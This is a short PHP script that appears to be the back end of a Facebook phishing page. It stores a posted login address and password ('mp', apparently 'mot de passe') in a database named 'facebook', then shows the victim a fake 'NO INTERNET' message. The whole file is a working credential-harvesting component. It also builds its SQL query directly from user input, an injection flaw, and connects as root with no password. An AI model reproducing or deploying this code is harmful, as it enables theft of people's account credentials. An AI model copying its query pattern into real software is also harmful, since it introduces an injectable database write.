<?php
$con=mysqli_connect("localhost","root","","facebook") or die(mysqli_error($con));
$adr=$_POST["adr"];
$mp=$_POST["mp"];
$req="INSERT INTO `data`(`adrs`, `mp`) VALUES ('$adr','$mp')";
mysqli_query($con,$req);
 echo("NO INTERNET");
mysqli_close($con);
?>